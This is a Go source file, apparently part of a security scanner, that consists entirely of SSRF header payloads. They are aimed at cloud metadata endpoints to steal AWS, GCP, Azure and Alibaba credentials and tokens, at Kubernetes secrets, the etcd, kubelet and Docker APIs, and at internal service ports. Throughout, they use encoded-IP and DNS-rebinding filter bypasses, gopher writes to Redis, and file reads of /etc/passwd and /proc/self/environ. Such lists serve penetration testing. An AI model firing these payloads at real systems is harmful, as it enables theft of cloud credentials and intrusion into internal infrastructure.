package headers

import "github.com/cc1a2b/hhunter/engine"

func GetSSRFMutations() []engine.Mutation {
	return []engine.Mutation{
		// ===================================================================
		// AWS IMDSv1 — Classic metadata access
		// ===================================================================
		{Header: "X-Forwarded-Host", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS IMDSv1 Metadata SSRF"},
		{Header: "X-Host", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS IMDSv1 Metadata SSRF"},
		{Header: "X-Original-Host", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS IMDSv1 Metadata SSRF"},
		{Header: "Host", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS IMDSv1 Metadata via Host"},
		{Header: "X-Forwarded-Server", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS IMDSv1 Metadata SSRF"},
		{Header: "X-Backend-Host", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS IMDSv1 via Backend Host"},
		{Header: "X-Upstream", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS IMDSv1 via X-Upstream"},

		// AWS specific paths via X-Original-URL / X-Rewrite-URL
		{Header: "X-Original-URL", Value: "/latest/meta-data/", Category: "SSRF", Impact: "AWS Metadata Path Override"},
		{Header: "X-Original-URL", Value: "/latest/meta-data/iam/security-credentials/", Category: "SSRF", Impact: "AWS IAM Credentials Path Override"},
		{Header: "X-Original-URL", Value: "/latest/user-data", Category: "SSRF", Impact: "AWS User-Data Path Override"},
		{Header: "X-Rewrite-URL", Value: "/latest/meta-data/iam/security-credentials/", Category: "SSRF", Impact: "AWS IAM Creds via Rewrite"},

		// ===================================================================
		// AWS IMDSv2 — Token-based access (the real 2026 attack vector)
		// IMDSv2 requires PUT with X-aws-ec2-metadata-token-ttl-seconds header
		// If we can forge these headers, we can bypass IMDSv2 protection
		// ===================================================================
		{Header: "X-aws-ec2-metadata-token-ttl-seconds", Value: "21600", Category: "SSRF", Impact: "AWS IMDSv2 Token TTL Header Injection"},
		{Header: "X-aws-ec2-metadata-token", Value: "AQAAABiCgXIpL00-invalid-probe", Category: "SSRF", Impact: "AWS IMDSv2 Token Injection Probe"},
		{Header: "X-Forwarded-Host", Value: "169.254.169.254/latest/api/token", Category: "SSRF", Impact: "AWS IMDSv2 Token Endpoint SSRF"},

		// AWS ECS Task Metadata (container credential theft)
		{Header: "X-Forwarded-Host", Value: "169.254.170.2", Category: "SSRF", Impact: "AWS ECS Task Metadata SSRF"},
		{Header: "Host", Value: "169.254.170.2", Category: "SSRF", Impact: "AWS ECS Task Metadata via Host"},
		{Header: "X-Original-URL", Value: "/v2/metadata", Category: "SSRF", Impact: "AWS ECS Metadata Path"},
		{Header: "X-Original-URL", Value: "/v2/credentials/", Category: "SSRF", Impact: "AWS ECS Credentials Path"},

		// AWS Lambda Runtime API
		{Header: "X-Forwarded-Host", Value: "127.0.0.1:9001", Category: "SSRF", Impact: "AWS Lambda Runtime API SSRF"},
		{Header: "Host", Value: "127.0.0.1:9001", Category: "SSRF", Impact: "AWS Lambda Runtime via Host"},
		{Header: "X-Original-URL", Value: "/2018-06-01/runtime/invocation/next", Category: "SSRF", Impact: "AWS Lambda Invocation Next"},
		{Header: "X-Original-URL", Value: "/2018-06-01/runtime/invocation/latest/response", Category: "SSRF", Impact: "AWS Lambda Invocation Response"},

		// ===================================================================
		// GCP Metadata — Requires Metadata-Flavor: Google header
		// ===================================================================
		{Header: "X-Forwarded-Host", Value: "metadata.google.internal", Category: "SSRF", Impact: "GCP Metadata SSRF"},
		{Header: "Host", Value: "metadata.google.internal", Category: "SSRF", Impact: "GCP Metadata via Host"},
		{Header: "X-Host", Value: "metadata.google.internal", Category: "SSRF", Impact: "GCP Metadata via X-Host"},
		{Header: "Metadata-Flavor", Value: "Google", Category: "SSRF", Impact: "GCP Metadata Flavor Header"},
		{Header: "X-Google-Metadata-Request", Value: "True", Category: "SSRF", Impact: "GCP Metadata Request Header"},

		// GCP specific paths
		{Header: "X-Original-URL", Value: "/computeMetadata/v1/instance/service-accounts/default/token", Category: "SSRF", Impact: "GCP Service Account Token Path"},
		{Header: "X-Original-URL", Value: "/computeMetadata/v1/project/project-id", Category: "SSRF", Impact: "GCP Project ID Path"},
		{Header: "X-Original-URL", Value: "/computeMetadata/v1/instance/attributes/kube-env", Category: "SSRF", Impact: "GCP K8s Env Path"},

		// GCP via alternative hostname
		{Header: "X-Forwarded-Host", Value: "169.254.169.254", Category: "SSRF", Impact: "GCP Metadata via IP"},
		{Header: "Host", Value: "metadata", Category: "SSRF", Impact: "GCP Metadata Short Hostname"},

		// ===================================================================
		// Azure IMDS — Instance Metadata Service
		// ===================================================================
		{Header: "X-Forwarded-Host", Value: "169.254.169.254", Category: "SSRF", Impact: "Azure IMDS SSRF"},
		{Header: "Metadata", Value: "true", Category: "SSRF", Impact: "Azure IMDS Metadata Header"},

		// Azure Managed Identity token theft (Critical)
		{Header: "X-Original-URL", Value: "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", Category: "SSRF", Impact: "Azure Managed Identity Token Theft"},
		{Header: "X-Original-URL", Value: "/metadata/instance?api-version=2021-02-01", Category: "SSRF", Impact: "Azure Instance Metadata"},
		{Header: "X-Original-URL", Value: "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net", Category: "SSRF", Impact: "Azure Key Vault Token Theft"},
		{Header: "X-Original-URL", Value: "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/", Category: "SSRF", Impact: "Azure Storage Token Theft"},
		{Header: "X-Original-URL", Value: "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/", Category: "SSRF", Impact: "Azure Graph API Token Theft"},

		// Azure App Service specific
		{Header: "X-Forwarded-Host", Value: "169.254.130.1", Category: "SSRF", Impact: "Azure App Service Metadata"},
		{Header: "X-Original-URL", Value: "/metadata/v1/InstanceInfo", Category: "SSRF", Impact: "Azure Legacy Instance Info"},

		// ===================================================================
		// DigitalOcean Metadata
		// ===================================================================
		{Header: "X-Forwarded-Host", Value: "169.254.169.254", Category: "SSRF", Impact: "DO Metadata SSRF"},
		{Header: "X-Original-URL", Value: "/metadata/v1/", Category: "SSRF", Impact: "DO Metadata Path"},
		{Header: "X-Original-URL", Value: "/metadata/v1/id", Category: "SSRF", Impact: "DO Droplet ID"},
		{Header: "X-Original-URL", Value: "/metadata/v1/user-data", Category: "SSRF", Impact: "DO User Data"},

		// ===================================================================
		// Alibaba Cloud Metadata
		// ===================================================================
		{Header: "X-Forwarded-Host", Value: "100.100.100.200", Category: "SSRF", Impact: "Alibaba Cloud Metadata SSRF"},
		{Header: "Host", Value: "100.100.100.200", Category: "SSRF", Impact: "Alibaba Cloud Metadata via Host"},
		{Header: "X-Original-URL", Value: "/latest/meta-data/ram/security-credentials/", Category: "SSRF", Impact: "Alibaba RAM Credentials"},

		// ===================================================================
		// Oracle Cloud IMDS
		// ===================================================================
		{Header: "X-Forwarded-Host", Value: "192.0.0.192", Category: "SSRF", Impact: "Oracle Cloud IMDS SSRF"},
		{Header: "Authorization", Value: "Bearer Oracle", Category: "SSRF", Impact: "Oracle Cloud IMDS Auth Header"},
		{Header: "X-Original-URL", Value: "/opc/v2/instance/", Category: "SSRF", Impact: "Oracle Cloud Instance Metadata"},

		// ===================================================================
		// IBM Cloud Metadata
		// ===================================================================
		{Header: "X-Forwarded-Host", Value: "169.254.169.254", Category: "SSRF", Impact: "IBM Cloud Metadata SSRF"},
		{Header: "X-Original-URL", Value: "/latest/meta-data/", Category: "SSRF", Impact: "IBM Cloud Metadata Path"},

		// ===================================================================
		// Hetzner Cloud Metadata
		// ===================================================================
		{Header: "X-Forwarded-Host", Value: "169.254.169.254", Category: "SSRF", Impact: "Hetzner Metadata SSRF"},
		{Header: "X-Original-URL", Value: "/hetzner/v1/metadata", Category: "SSRF", Impact: "Hetzner Metadata Path"},

		// ===================================================================
		// Kubernetes — Service Account & API Server
		// ===================================================================
		{Header: "X-Forwarded-Host", Value: "kubernetes.default.svc", Category: "SSRF", Impact: "K8s API Server SSRF"},
		{Header: "Host", Value: "kubernetes.default.svc", Category: "SSRF", Impact: "K8s API Server via Host"},
		{Header: "X-Forwarded-Host", Value: "kubernetes.default.svc.cluster.local", Category: "SSRF", Impact: "K8s API FQDN SSRF"},
		{Header: "X-Forwarded-Host", Value: "kubernetes.default", Category: "SSRF", Impact: "K8s API Short SSRF"},
		{Header: "X-Forwarded-Host", Value: "10.0.0.1", Category: "SSRF", Impact: "K8s API Common IP SSRF"},
		{Header: "X-Forwarded-Host", Value: "10.96.0.1", Category: "SSRF", Impact: "K8s Default Service CIDR SSRF"},

		// K8s specific paths for secret/token theft
		{Header: "X-Original-URL", Value: "/api/v1/namespaces/default/secrets", Category: "SSRF", Impact: "K8s Secrets Enumeration"},
		{Header: "X-Original-URL", Value: "/api/v1/namespaces/kube-system/secrets", Category: "SSRF", Impact: "K8s System Secrets Enumeration"},
		{Header: "X-Original-URL", Value: "/api/v1/pods", Category: "SSRF", Impact: "K8s Pod Enumeration"},
		{Header: "X-Original-URL", Value: "/api/v1/nodes", Category: "SSRF", Impact: "K8s Node Enumeration"},
		{Header: "X-Original-URL", Value: "/apis/apps/v1/deployments", Category: "SSRF", Impact: "K8s Deployment Enumeration"},
		{Header: "X-Original-URL", Value: "/healthz", Category: "SSRF", Impact: "K8s Healthcheck Probe"},
		{Header: "X-Original-URL", Value: "/version", Category: "SSRF", Impact: "K8s Version Disclosure"},

		// K8s etcd direct access
		{Header: "X-Forwarded-Host", Value: "localhost:2379", Category: "SSRF", Impact: "K8s etcd Direct Access"},
		{Header: "X-Forwarded-Host", Value: "etcd.kube-system.svc:2379", Category: "SSRF", Impact: "K8s etcd Service SSRF"},

		// K8s kubelet API (node-level access)
		{Header: "X-Forwarded-Host", Value: "localhost:10250", Category: "SSRF", Impact: "Kubelet API SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:10255", Category: "SSRF", Impact: "Kubelet Read-Only API SSRF"},

		// ===================================================================
		// Docker API
		// ===================================================================
		{Header: "X-Forwarded-Host", Value: "localhost:2375", Category: "SSRF", Impact: "Docker API Unauth SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:2376", Category: "SSRF", Impact: "Docker API TLS SSRF"},
		{Header: "X-Original-URL", Value: "/v1.41/containers/json", Category: "SSRF", Impact: "Docker Container List"},
		{Header: "X-Original-URL", Value: "/v1.41/images/json", Category: "SSRF", Impact: "Docker Image List"},

		// ===================================================================
		// Internal Service Discovery — Comprehensive port scan via headers
		// ===================================================================
		// Web servers / App servers
		{Header: "X-Forwarded-Host", Value: "localhost:80", Category: "SSRF", Impact: "Internal HTTP SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:443", Category: "SSRF", Impact: "Internal HTTPS SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:8080", Category: "SSRF", Impact: "Internal Tomcat/App SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:8443", Category: "SSRF", Impact: "Internal HTTPS Alt SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:8888", Category: "SSRF", Impact: "Internal Dev Server SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:3000", Category: "SSRF", Impact: "Grafana/Node SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:4200", Category: "SSRF", Impact: "Angular Dev SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:5000", Category: "SSRF", Impact: "Flask/Registry SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:5173", Category: "SSRF", Impact: "Vite Dev SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:8000", Category: "SSRF", Impact: "Django/FastAPI SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:9000", Category: "SSRF", Impact: "SonarQube/PHP-FPM SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:9090", Category: "SSRF", Impact: "Prometheus SSRF"},

		// Databases
		{Header: "X-Forwarded-Host", Value: "localhost:3306", Category: "SSRF", Impact: "MySQL SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:5432", Category: "SSRF", Impact: "PostgreSQL SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:27017", Category: "SSRF", Impact: "MongoDB SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:6379", Category: "SSRF", Impact: "Redis SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:11211", Category: "SSRF", Impact: "Memcached SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:9200", Category: "SSRF", Impact: "Elasticsearch SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:9300", Category: "SSRF", Impact: "Elasticsearch Transport SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:5601", Category: "SSRF", Impact: "Kibana SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:8529", Category: "SSRF", Impact: "ArangoDB SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:7474", Category: "SSRF", Impact: "Neo4j SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:8086", Category: "SSRF", Impact: "InfluxDB SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:9042", Category: "SSRF", Impact: "Cassandra SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:1433", Category: "SSRF", Impact: "MSSQL SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:1521", Category: "SSRF", Impact: "Oracle DB SSRF"},

		// Message queues
		{Header: "X-Forwarded-Host", Value: "localhost:5672", Category: "SSRF", Impact: "RabbitMQ SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:15672", Category: "SSRF", Impact: "RabbitMQ Management SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:9092", Category: "SSRF", Impact: "Kafka SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:4222", Category: "SSRF", Impact: "NATS SSRF"},

		// Service mesh / orchestration
		{Header: "X-Forwarded-Host", Value: "localhost:8500", Category: "SSRF", Impact: "Consul SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:8600", Category: "SSRF", Impact: "Consul DNS SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:2379", Category: "SSRF", Impact: "etcd SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:8200", Category: "SSRF", Impact: "Vault SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:4646", Category: "SSRF", Impact: "Nomad SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:15000", Category: "SSRF", Impact: "Envoy Admin SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:15001", Category: "SSRF", Impact: "Istio Envoy SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:15010", Category: "SSRF", Impact: "Istio Pilot SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:20000", Category: "SSRF", Impact: "Consul Connect SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:8001", Category: "SSRF", Impact: "Kong Admin SSRF"},

		// Monitoring / APM
		{Header: "X-Forwarded-Host", Value: "localhost:16686", Category: "SSRF", Impact: "Jaeger SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:9411", Category: "SSRF", Impact: "Zipkin SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:3100", Category: "SSRF", Impact: "Loki SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:4317", Category: "SSRF", Impact: "OpenTelemetry gRPC SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:4318", Category: "SSRF", Impact: "OpenTelemetry HTTP SSRF"},

		// CI/CD
		{Header: "X-Forwarded-Host", Value: "localhost:8081", Category: "SSRF", Impact: "Nexus/Jenkins SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:9000", Category: "SSRF", Impact: "SonarQube SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:8082", Category: "SSRF", Impact: "Artifactory SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:50000", Category: "SSRF", Impact: "Jenkins Agent SSRF"},

		// Admin panels
		{Header: "X-Forwarded-Host", Value: "localhost:4444", Category: "SSRF", Impact: "Internal Debug SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:1080", Category: "SSRF", Impact: "SOCKS Proxy SSRF"},
		{Header: "X-Forwarded-Host", Value: "localhost:6060", Category: "SSRF", Impact: "Go pprof SSRF"},

		// ===================================================================
		// IP Bypass Techniques — Comprehensive WAF/Filter evasion
		// ===================================================================
		// Standard representations
		{Header: "X-Forwarded-Host", Value: "0177.0.0.1", Category: "SSRF", Impact: "Octal IP SSRF Bypass"},
		{Header: "X-Forwarded-Host", Value: "0x7f000001", Category: "SSRF", Impact: "Hex IP SSRF Bypass"},
		{Header: "X-Forwarded-Host", Value: "2130706433", Category: "SSRF", Impact: "Decimal IP SSRF Bypass"},
		{Header: "X-Forwarded-Host", Value: "0000::1", Category: "SSRF", Impact: "IPv6 Compressed SSRF"},
		{Header: "X-Forwarded-Host", Value: "[::ffff:127.0.0.1]", Category: "SSRF", Impact: "IPv6 Mapped IPv4 SSRF"},
		{Header: "X-Forwarded-Host", Value: "0.0.0.0", Category: "SSRF", Impact: "Null Route SSRF"},
		{Header: "X-Forwarded-Host", Value: "[::]", Category: "SSRF", Impact: "IPv6 Any Address SSRF"},

		// Advanced obfuscation
		{Header: "X-Forwarded-Host", Value: "0x7f.0x0.0x0.0x1", Category: "SSRF", Impact: "Hex Dotted IP SSRF"},
		{Header: "X-Forwarded-Host", Value: "0177.0000.0000.0001", Category: "SSRF", Impact: "Full Octal IP SSRF"},
		{Header: "X-Forwarded-Host", Value: "127.0.1", Category: "SSRF", Impact: "Short IP SSRF"},
		{Header: "X-Forwarded-Host", Value: "127.1", Category: "SSRF", Impact: "Minimal IP SSRF"},
		{Header: "X-Forwarded-Host", Value: "127.000.000.001", Category: "SSRF", Impact: "Padded Octal IP SSRF"},
		{Header: "X-Forwarded-Host", Value: "[0:0:0:0:0:ffff:127.0.0.1]", Category: "SSRF", Impact: "IPv6 Full Mapped SSRF"},
		{Header: "X-Forwarded-Host", Value: "[::ffff:7f00:1]", Category: "SSRF", Impact: "IPv6 Hex Mapped SSRF"},
		{Header: "X-Forwarded-Host", Value: "0177.1", Category: "SSRF", Impact: "Mixed Octal Short SSRF"},
		{Header: "X-Forwarded-Host", Value: "①②⑦.⓪.⓪.①", Category: "SSRF", Impact: "Unicode Number SSRF"},
		{Header: "X-Forwarded-Host", Value: "127.0.0.1%00", Category: "SSRF", Impact: "Null Byte Suffix SSRF"},
		{Header: "X-Forwarded-Host", Value: "127.0.0.1%23", Category: "SSRF", Impact: "Fragment IP SSRF"},

		// URL authority confusion
		{Header: "X-Forwarded-Host", Value: "evil.com@169.254.169.254", Category: "SSRF", Impact: "URL Authority Confusion SSRF"},
		{Header: "X-Forwarded-Host", Value: "169.254.169.254#evil.com", Category: "SSRF", Impact: "URL Fragment Confusion SSRF"},
		{Header: "X-Forwarded-Host", Value: "169.254.169.254:80@evil.com", Category: "SSRF", Impact: "URL Port Authority SSRF"},

		// Metadata via 169.254.x.x range
		{Header: "X-Forwarded-Host", Value: "0xa9fea9fe", Category: "SSRF", Impact: "Hex 169.254.169.254 SSRF"},
		{Header: "X-Forwarded-Host", Value: "2852039166", Category: "SSRF", Impact: "Decimal 169.254.169.254 SSRF"},
		{Header: "X-Forwarded-Host", Value: "0251.0376.0251.0376", Category: "SSRF", Impact: "Octal 169.254.169.254 SSRF"},

		// ===================================================================
		// DNS Rebinding & Wildcard DNS
		// ===================================================================
		{Header: "X-Forwarded-Host", Value: "127.0.0.1.nip.io", Category: "SSRF", Impact: "DNS Rebinding nip.io SSRF"},
		{Header: "X-Forwarded-Host", Value: "localtest.me", Category: "SSRF", Impact: "DNS Localhost Alias SSRF"},
		{Header: "X-Forwarded-Host", Value: "127.0.0.1.sslip.io", Category: "SSRF", Impact: "DNS Rebinding sslip.io SSRF"},
		{Header: "X-Forwarded-Host", Value: "169.254.169.254.nip.io", Category: "SSRF", Impact: "DNS Rebinding AWS SSRF"},
		{Header: "X-Forwarded-Host", Value: "spoofed.burpcollaborator.net", Category: "SSRF", Impact: "OOB SSRF Detection"},
		{Header: "X-Forwarded-Host", Value: "vcap.me", Category: "SSRF", Impact: "DNS vcap.me Localhost SSRF"},
		{Header: "X-Forwarded-Host", Value: "lvh.me", Category: "SSRF", Impact: "DNS lvh.me Localhost SSRF"},
		{Header: "X-Forwarded-Host", Value: "127-0-0-1.traefik.me", Category: "SSRF", Impact: "DNS traefik.me Localhost SSRF"},
		{Header: "X-Forwarded-Host", Value: "oast.pro", Category: "SSRF", Impact: "ProjectDiscovery OOB SSRF"},
		{Header: "X-Forwarded-Host", Value: "oast.live", Category: "SSRF", Impact: "ProjectDiscovery OOB Live SSRF"},

		// ===================================================================
		// Referer-based SSRF — Deep endpoint targeting
		// ===================================================================
		{Header: "Referer", Value: "http://169.254.169.254/latest/meta-data/", Category: "SSRF", Impact: "Referer SSRF to AWS Metadata"},
		{Header: "Referer", Value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", Category: "SSRF", Impact: "Referer SSRF to AWS IAM Creds"},
		{Header: "Referer", Value: "http://metadata.google.internal/computeMetadata/v1/", Category: "SSRF", Impact: "Referer SSRF to GCP Metadata"},
		{Header: "Referer", Value: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", Category: "SSRF", Impact: "Referer SSRF to Azure Token"},
		{Header: "Referer", Value: "http://localhost:8080/admin", Category: "SSRF", Impact: "Referer SSRF to Internal Admin"},
		{Header: "Referer", Value: "http://127.0.0.1:9090/metrics", Category: "SSRF", Impact: "Referer SSRF to Prometheus"},
		{Header: "Referer", Value: "http://localhost:8200/v1/secret/data/", Category: "SSRF", Impact: "Referer SSRF to Vault Secrets"},
		{Header: "Referer", Value: "http://kubernetes.default.svc/api/v1/namespaces/default/secrets", Category: "SSRF", Impact: "Referer SSRF to K8s Secrets"},

		// ===================================================================
		// Webhook/Callback SSRF — Application layer
		// ===================================================================
		{Header: "X-Callback-URL", Value: "http://169.254.169.254/latest/meta-data/", Category: "SSRF", Impact: "Callback SSRF AWS Metadata"},
		{Header: "X-Webhook-URL", Value: "http://169.254.169.254/latest/meta-data/", Category: "SSRF", Impact: "Webhook SSRF AWS Metadata"},
		{Header: "X-Notification-URL", Value: "http://127.0.0.1:8080/", Category: "SSRF", Impact: "Notification Callback SSRF"},
		{Header: "X-Redirect-URL", Value: "http://169.254.169.254/", Category: "SSRF", Impact: "Redirect SSRF"},
		{Header: "Destination", Value: "http://169.254.169.254/", Category: "SSRF", Impact: "WebDAV Destination SSRF"},
		{Header: "X-Proxy-URL", Value: "http://169.254.169.254/", Category: "SSRF", Impact: "Proxy URL SSRF"},
		{Header: "X-Request-URI", Value: "http://169.254.169.254/", Category: "SSRF", Impact: "Request URI SSRF"},
		{Header: "X-Api-Url", Value: "http://169.254.169.254/", Category: "SSRF", Impact: "API URL SSRF"},
		{Header: "X-Config-URL", Value: "http://169.254.169.254/latest/meta-data/", Category: "SSRF", Impact: "Config URL SSRF"},
		{Header: "X-Origin-URL", Value: "http://127.0.0.1:8080/", Category: "SSRF", Impact: "Origin URL SSRF"},
		{Header: "X-Import-URL", Value: "http://169.254.169.254/", Category: "SSRF", Impact: "Import URL SSRF"},
		{Header: "X-Preview-URL", Value: "http://169.254.169.254/", Category: "SSRF", Impact: "Preview URL SSRF"},

		// ===================================================================
		// URL Scheme Bypass (gopher, file, dict)
		// ===================================================================
		{Header: "X-Forwarded-Host", Value: "file:///etc/passwd", Category: "SSRF", Impact: "File Protocol SSRF"},
		{Header: "X-Forwarded-Host", Value: "gopher://127.0.0.1:6379/_INFO", Category: "SSRF", Impact: "Gopher Redis SSRF"},
		{Header: "X-Forwarded-Host", Value: "dict://127.0.0.1:6379/INFO", Category: "SSRF", Impact: "Dict Redis SSRF"},
		{Header: "Referer", Value: "file:///etc/passwd", Category: "SSRF", Impact: "File Protocol via Referer"},
		{Header: "Referer", Value: "gopher://127.0.0.1:25/xHELO%20attacker", Category: "SSRF", Impact: "Gopher SMTP SSRF"},
		{Header: "X-Callback-URL", Value: "gopher://127.0.0.1:6379/_SET%20pwned%20true", Category: "SSRF", Impact: "Gopher Redis Write SSRF"},
		{Header: "X-Callback-URL", Value: "file:///proc/self/environ", Category: "SSRF", Impact: "Proc Environ SSRF"},
		{Header: "X-Callback-URL", Value: "file:///proc/self/cmdline", Category: "SSRF", Impact: "Proc Cmdline SSRF"},

		// ===================================================================
		// Multi-header delivery for maximum coverage
		// ===================================================================
		{Header: "X-Client-IP", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS Metadata via X-Client-IP"},
		{Header: "X-Real-IP", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS Metadata via X-Real-IP"},
		{Header: "X-Originating-IP", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS Metadata via X-Originating-IP"},
		{Header: "X-Remote-Addr", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS Metadata via X-Remote-Addr"},
		{Header: "CF-Connecting-IP", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS Metadata via CF-Connecting-IP"},
		{Header: "True-Client-IP", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS Metadata via True-Client-IP"},
		{Header: "Forwarded", Value: "for=169.254.169.254", Category: "SSRF", Impact: "AWS Metadata via Forwarded"},
		{Header: "X-ProxyUser-Ip", Value: "169.254.169.254", Category: "SSRF", Impact: "AWS Metadata via X-ProxyUser-Ip"},
	}
}
